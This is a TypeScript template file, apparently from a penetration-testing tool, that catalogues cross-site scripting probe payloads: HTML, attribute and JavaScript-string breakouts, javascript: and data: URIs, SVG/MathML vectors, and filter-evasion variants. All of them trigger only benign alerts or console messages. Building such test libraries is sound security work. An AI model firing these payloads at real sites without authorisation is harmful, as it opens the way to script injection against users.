import { TemplateCategory } from '../../types/template';

export const xssCategory: TemplateCategory = {
  id: 'xss',
  label: 'XSS',
  description: 'Cross-Site Scripting (XSS) reflection probes, contextual boundary breakouts, HTML5 vectors, and filter analysis templates',
  iconName: 'Code',
  subcategories: [
    // ========================================================================
    // 1. HTML CONTEXT INJECTION
    // ========================================================================
    {
      id: 'html-context',
      label: 'HTML Context Probes',
      description: 'Standard HTML tag reflection probes and basic execution vectors for testing raw HTML rendering',
      templates: [
        {
          id: 'xss-basic-script',
          name: 'Basic Script Tag',
          description: 'Standard script element testing direct HTML execution with a benign numeric alert',
          content: '<script>alert({payload_value})</script>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-script-domain',
          name: 'Script Tag (document.domain)',
          description: 'Executes benign alert displaying current origin domain to demonstrate execution context',
          content: '<script>alert(document.domain)</script>'
        },
        {
          id: 'xss-img-onerror',
          name: 'Image OnError Vector',
          description: 'Triggers inline handler via invalid image source attribute loading error',
          content: '<img src="invalid-image" onerror="alert({payload_value})">',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-audio-onerror',
          name: 'Audio Element OnError',
          description: 'Uses HTML5 audio media element error event to trigger benign alert handler',
          content: '<audio src="x" onerror="alert({payload_value})">',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-video-onerror',
          name: 'Video Element OnError',
          description: 'Uses HTML5 video media element error event to trigger benign alert handler',
          content: '<video src="x" onerror="alert({payload_value})">',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-details-ontoggle',
          name: 'Details Ontoggle Vector',
          description: 'Auto-executing HTML5 details toggle event triggered by open attribute state',
          content: '<details open ontoggle="alert({payload_value})">',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-marquee-onstart',
          name: 'Marquee OnStart Vector',
          description: 'Triggers inline script handler on marquee animation start lifecycle',
          content: '<marquee onstart="alert({payload_value})">XSS</marquee>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-script-module',
          name: 'Script Type Module',
          description: 'ES6 module script tag for testing modern JavaScript runtime reflection',
          content: '<script type="module">alert({payload_value})</script>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 2. ATTRIBUTE BREAKOUT PATTERNS
    // ========================================================================
    {
      id: 'attribute-breakout',
      label: 'Attribute Breakouts',
      description: 'Syntax sequences for escaping double/single quoted attribute values and injecting event handlers',
      templates: [
        {
          id: 'xss-break-double-quote-tag',
          name: 'Double-Quote Tag Breakout',
          description: 'Closes an enclosing double-quoted HTML attribute and opens a new script element',
          content: '"><script>alert({payload_value})</script>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-break-single-quote-tag',
          name: 'Single-Quote Tag Breakout',
          description: 'Closes an enclosing single-quoted HTML attribute and opens a new script element',
          content: '\'><script>alert({payload_value})</script>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-attr-onfocus-autofocus',
          name: 'OnFocus & AutoFocus (Double Quote)',
          description: 'Injects an onfocus event handler with autofocus to execute automatically without user action',
          content: '" onfocus="alert({payload_value})" autofocus="',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-attr-onfocus-single',
          name: 'OnFocus & AutoFocus (Single Quote)',
          description: 'Single-quote variant injecting autofocus handler inside single-quoted attribute values',
          content: '\' onfocus=\'alert({payload_value})\' autofocus=\'',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-attr-onmouseover',
          name: 'OnMouseOver Attribute Handler',
          description: 'Injects mouseover event handler inside tag attribute boundaries',
          content: '" onmouseover="alert({payload_value})" x="',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-attr-formaction',
          name: 'FormAction Override Vector',
          description: 'Overrides enclosing form destination URL with a javascript URI scheme',
          content: '" formaction="javascript:alert({payload_value})" type="submit',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-attr-style-expression',
          name: 'Style Attribute Probe',
          description: 'Tests CSS property value boundaries and style context injection',
          content: '" style="animation-name:x" onanimationstart="alert({payload_value})"',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-attr-unquoted-breakout',
          name: 'Unquoted Attribute Breakout',
          description: 'Escapes an unquoted HTML attribute value using whitespace separation',
          content: ' onfocus=alert({payload_value}) autofocus ',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 3. JAVASCRIPT CONTEXT ESCAPES
    // ========================================================================
    {
      id: 'js-context',
      label: 'JavaScript Context',
      description: 'Breakout tokens and expression wrappers for values reflected inside script blocks and inline functions',
      templates: [
        {
          id: 'xss-js-single-quote-break',
          name: 'Single-Quote String Breakout',
          description: 'Terminates an inline single-quoted JavaScript string literal and executes alert',
          content: '\';alert({payload_value});//',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-js-double-quote-break',
          name: 'Double-Quote String Breakout',
          description: 'Terminates an inline double-quoted JavaScript string literal and executes alert',
          content: '";alert({payload_value});//',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-js-close-script-tag',
          name: 'Script Tag Closure (</script>)',
          description: 'HTML parser takes precedence over JS lexer: closes enclosing script block and starts fresh tag',
          content: '</script><script>alert({payload_value})</script>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-js-template-literal',
          name: 'Template Literal (${...})',
          description: 'Evaluates arbitrary expression inside ES6 backtick template literal interpolation',
          content: '${alert({payload_value})}',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-js-arithmetic-operator',
          name: 'Arithmetic Operator Chain (-alert()-)',
          description: 'Executes function without semicolons via JavaScript binary expression operator chaining',
          content: '\'-alert({payload_value})-\'',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-js-bitwise-operator',
          name: 'Bitwise Operator Chain (|alert()|)',
          description: 'Executes function via bitwise OR operator chaining without statement termination',
          content: '\'|alert({payload_value})|\'',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-js-json-breakout',
          name: 'JSON Object Breakout',
          description: 'Closes a JSON dictionary literal and executes an inline payload sequence',
          content: '"};alert({payload_value});{"x":"',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-js-callback-wrapper',
          name: 'Function Call Wrapper (");...(")',
          description: 'Balances surrounding function call parentheses while executing payload',
          content: '\');alert({payload_value});(\'',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 4. URI & LINK SCHEMES
    // ========================================================================
    {
      id: 'uri-schemes',
      label: 'URI Schemes (javascript:)',
      description: 'Pseudo-protocol execution vectors for testing reflection in href, src, and destination attributes',
      templates: [
        {
          id: 'xss-uri-javascript-basic',
          name: 'Basic javascript: Scheme',
          description: 'Standard javascript pseudo-protocol for href, iframe, and action attributes',
          content: 'javascript:alert({payload_value})',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-uri-javascript-domain',
          name: 'javascript:alert(document.domain)',
          description: 'Executes alert displaying origin host to demonstrate cross-origin boundary status',
          content: 'javascript:alert(document.domain)'
        },
        {
          id: 'xss-uri-confirm',
          name: 'javascript:confirm(1)',
          description: 'Uses confirm modal dialog as an alternative execution verification probe',
          content: 'javascript:confirm(1)'
        },
        {
          id: 'xss-uri-data-html-base64',
          name: 'Data URI Base64 HTML',
          description: 'Base64 encoded data URI delivering self-contained HTML script payload',
          content: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
        },
        {
          id: 'xss-uri-data-html-plain',
          name: 'Data URI Plaintext Script',
          description: 'Plaintext data URI containing inline script element',
          content: 'data:text/html,<script>alert(1)</script>'
        },
        {
          id: 'xss-uri-spaced-comment',
          name: 'javascript: with Comment Spacer',
          description: 'Tests URI parser tolerance against inline block comments within scheme declaration',
          content: 'javascript:/*--*///alert(1)'
        },
        {
          id: 'xss-uri-vbscript-legacy',
          name: 'Legacy vbscript: Scheme (IE/Legacy)',
          description: 'Historical VBScript execution scheme supported by legacy browser engines',
          content: 'vbscript:alert(1)'
        }
      ]
    },

    // ========================================================================
    // 5. SVG, MATHML & MODERN HTML5 VECTORS
    // ========================================================================
    {
      id: 'svg-mathml',
      label: 'SVG & MathML Vectors',
      description: 'XML namespace parsing vectors, SVG animation elements, and MathML execution patterns',
      templates: [
        {
          id: 'xss-svg-onload-basic',
          name: 'SVG OnLoad Vector',
          description: 'Standard SVG root element onload event handler supported across all modern browsers',
          content: '<svg onload="alert({payload_value})">',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-svg-script-inner',
          name: 'SVG Inner Script Tag',
          description: 'Executes standard script element nested inside SVG XML namespace',
          content: '<svg><script>alert({payload_value})</script></svg>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-svg-animate-onbegin',
          name: 'SVG Animate OnBegin',
          description: 'Uses SVG animation lifecycle event to trigger execution on animation start',
          content: '<svg><animate onbegin="alert({payload_value})" attributeName="x" dur="1s">',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-svg-set-onbegin',
          name: 'SVG Set OnBegin',
          description: 'Uses SVG set element lifecycle event to trigger execution without animation frames',
          content: '<svg><set onbegin="alert({payload_value})" attributeName="x">',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-mathml-script',
          name: 'MathML Script Injection',
          description: 'Embeds script element within MathML text container namespace',
          content: '<math><mtext><script>alert({payload_value})</script></mtext></math>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-mathml-href',
          name: 'MathML XLink / HRef Click',
          description: 'MathML namespace element supporting clickable pseudo-protocol execution',
          content: '<math href="javascript:alert({payload_value})">click</math>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-object-data-uri',
          name: 'Object Tag Data Vector',
          description: 'HTML object element loading javascript URI into embedded object context',
          content: '<object data="javascript:alert({payload_value})">',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-iframe-srcdoc',
          name: 'Iframe Srcdoc Vector',
          description: 'Uses HTML5 iframe srcdoc attribute to evaluate embedded HTML without network requests',
          content: '<iframe srcdoc="<script>alert({payload_value})</script>"></iframe>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        }
      ]
    },

    // ========================================================================
    // 6. FILTER & WAF EVASION PATTERNS
    // ========================================================================
    {
      id: 'filter-waf-evasion',
      label: 'WAF Evasion & Obfuscation',
      description: 'Case mutations, delimiter variations, character encoding bypasses, and alternative execution patterns',
      templates: [
        {
          id: 'xss-evade-mixed-case',
          name: 'Mixed-Case Tag Mutation',
          description: 'Tests case-sensitive keyword blacklists using mixed casing in tag declarations',
          content: '<sCrIpt>alert({payload_value})</sCrIpt>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-evade-slash-separator',
          name: 'Slash Tag Separator (<svg/onload>)',
          description: 'Uses forward slash instead of whitespace between tag name and attribute',
          content: '<svg/onload=alert({payload_value})>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-evade-unquoted-onerror',
          name: 'Unquoted Attribute Delimiters',
          description: 'Omits quotation marks around attribute values to bypass quote-based regex filters',
          content: '<img src=x onerror=alert({payload_value})>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-evade-newline-separator',
          name: 'Newline / Tab Separator',
          description: 'Replaces standard spaces with newline characters to evade single-line regex rules',
          content: '<svg\nonload=alert({payload_value})>',
          parameters: [
            { id: 'payload_value', label: 'Alert Value', defaultValue: '1', inputType: 'text' }
          ]
        },
        {
          id: 'xss-evade-entity-decimal',
          name: 'HTML Decimal Entity Encoding',
          description: 'Encodes javascript pseudo-protocol characters as decimal entities inside link href attributes',
          content: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>'
        },
        {
          id: 'xss-evade-entity-hex',
          name: 'HTML Hex Entity Encoding',
          description: 'Encodes javascript pseudo-protocol characters as hexadecimal entities inside link href attributes',
          content: '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">click</a>'
        },
        {
          id: 'xss-evade-fromcharcode',
          name: 'String.fromCharCode Vector',
          description: 'Constructs argument string dynamically from character codes without quotation marks',
          content: '<script>alert(String.fromCharCode(88,83,83))</script>'
        },
        {
          id: 'xss-evade-eval-atob',
          name: 'eval(atob(...)) Base64 Decoding',
          description: 'Evaluates base64 decoded string payload to avoid plain keyword filtering',
          content: '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>'
        },
        {
          id: 'xss-evade-throw-catch',
          name: 'Throw / Catch Exception Syntax',
          description: 'Passes execution context into exception handler to test non-standard execution paths',
          content: '<svg onload="try{throw 1}catch(e){alert(e)}">'
        },
        {
          id: 'xss-evade-console-log',
          name: 'console.log Non-Alert Probe',
          description: 'Harmless console message logger used when alert/confirm dialogs are blocked or restricted',
          content: '<script>console.log(\'XSS-TEST-PASSED\')</script>'
        }
      ]
    }
  ]
};
